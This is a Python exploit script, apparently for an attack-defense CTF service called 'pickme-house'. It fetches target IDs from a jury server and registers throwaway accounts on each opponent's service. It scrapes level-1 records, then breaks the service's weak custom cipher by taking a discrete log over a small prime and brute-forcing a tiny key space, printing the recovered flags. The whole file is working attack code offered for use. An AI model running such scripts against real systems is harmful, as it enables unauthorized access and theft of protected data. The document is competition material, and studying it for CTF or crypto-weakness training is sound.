import sys
import json
import requests
import secrets
from bs4 import BeautifulSoup


JURY_IP = "10.10.10.10"
IP = sys.argv[1]
BASE_APP = f"http://{IP}:10000"

class SEA:
    P = 1997
    g = 16
    h = 2

    A = 0xDEADBEEFBAAD0A55
    B = 0x228F00DBABA1CAAA
    C = 0x5EC0DE526914808A
    D = 0xFADA6788D0001228

    ROUNDS = 8

    def unpad(self, data):
        pad_len = data[-1]
        if pad_len > 8 or pad_len == 0 or data[-pad_len:] != bytes([pad_len] * pad_len):
            raise ValueError("error: invalid padding")
        return data[:-pad_len]

    @staticmethod
    def cipher_block(block_int, k1, k2, decrypt=False):
        if decrypt:
            k1_inv = pow(k1, -1, 2**64)
            state = block_int
            for _ in range(SEA.ROUNDS):
                state ^= (state >> 32)
                state = (state - k2) & 0xFFFFFFFFFFFFFFFF
                state = (state * k1_inv) & 0xFFFFFFFFFFFFFFFF
            return state
        else:
            state = block_int
            for _ in range(SEA.ROUNDS):
                state = (state * k1) & 0xFFFFFFFFFFFFFFFF
                state = (state + k2) & 0xFFFFFFFFFFFFFFFF
                state ^= (state >> 32)
            return state

def get_attack_data():
    
    data = requests.get(f"http://{JURY_IP}/api/client/attack_data").json()['pickme-house'][IP]
    idlvl1 = []
    
    for item in data:
        user = {}
        item = item.replace("'", '"')
        user = json.loads(item)

        if  user.get('level', '').strip() == '1':
            rec_id = user.get('rec_id')
            if rec_id:
                idlvl1.append(rec_id)

    return idlvl1

def register_user(session, username, password):
    url = f"{BASE_APP}/register"
    data = {
        'user': username,
        'pwd': password,
        'pwd2': password
    }
    session.cookies.clear()
    response = session.post(url, data=data, allow_redirects=False)
    location = response.headers.get('Location', '')
    return response.status_code == 302 and 'login' in location

def login_user(session, username, password):
    url = f"{BASE_APP}/login"
    data = {
        'user': username,
        'pwd': password
    }
    response = session.post(url, data=data, allow_redirects=True)
    return '/index' in response.url or '/login' not in response.url

def get_level1_data(session, rec_id):
    url = f"{BASE_APP}/lookup"
    data = {
        'level': '1',
        'rec_id': rec_id
    }
    response = session.post(url, data=data)
    if response.status_code != 200:
        return None, None
    
    soup = BeautifulSoup(response.text, 'html.parser')
    
    if soup.find(string=lambda text: text and ('Нет такой записи' in text)):
        return None, None
    
    field_rows = soup.find_all('div', class_='field-row')
    
    ct_hex = None
    token_str = None
    
    for row in field_rows:
        label = row.find('div', class_='field-label')
        value = row.find('div', class_='field-value')
        
        if not label or not value:
            continue
        
        label_text = label.get_text(strip=True)
        value_text = value.get_text(strip=True)
        
        if 'Шифротекстик' in label_text:
            ct_hex = value_text.strip()
        elif 'Токен' in label_text:
            token_str = value_text.strip()
    
    if not (ct_hex and token_str):
        return None, None
    
    try:
        token = int(token_str)
        return ct_hex, token
    except ValueError:
        return None, None

def decrypt_level1(ct_hex, token):
    pickma = SEA()
    rainbow_table = {pow(pickma.h, s, pickma.P): s for s in range(2**16)}
    
    ct_hex = ct_hex.replace(' ', '').replace('\n', '').replace('\r', '').replace('\t', '')
    
    try:
        encrypted_flag = bytes.fromhex(ct_hex)
    except ValueError:
        return None
    
    if len(encrypted_flag) < 8:
        return None
    
    s_flag = rainbow_table.get(token)
    if s_flag is None:
        for s_test in range(2**16):
            if pow(pickma.h, s_test, pickma.P) == token:
                s_flag = s_test
                break
        if s_flag is None:
            return None
    
    for ikb in range(pickma.P):
        k1_cand = (ikb * pickma.A + pickma.B) & 0xFFFFFFFFFFFFFFFF
        k2_cand = (ikb * pickma.C + pickma.D) & 0xFFFFFFFFFFFFFFFF
        k1_cand |= 1
        
        flag = b''
        for j in range(0, len(encrypted_flag), 8):
            block = encrypted_flag[j:j+8]
            if len(block) < 8:
                block = block + b'\x00' * (8 - len(block))
            block_int = int.from_bytes(block, 'big')
            decrypted = SEA.cipher_block(block_int, k1_cand, k2_cand, decrypt=True)
            flag += decrypted.to_bytes(8, 'big')
        
        flag = flag[:len(encrypted_flag)]
        
        try:
            flag = pickma.unpad(flag)
            decoded = flag.decode('utf-8')
            return decoded
        except Exception:
            continue

    return None

def main():

    pickmeloxi = get_attack_data()

    session = requests.Session()
    
    for lox_id in pickmeloxi:
        username = f"pickmelox{secrets.token_hex(8)}"
        password = secrets.token_hex(16)
        
        if not register_user(session, username, password):
            print("не удалось зарегистрировать пользователя")
            return
        
        if not login_user(session, username, password):
            print("не удалось войти")
            return
        
        ct_hex, token = get_level1_data(session, lox_id)
        
        if not ct_hex or token is None:
            print("не удалось получить данные")
            return
        
        plaintext = decrypt_level1(ct_hex, token)
        
        if plaintext is None:
            print("не удалось расшифровать")
            return
        
        print(plaintext)

if __name__ == '__main__':
    main()

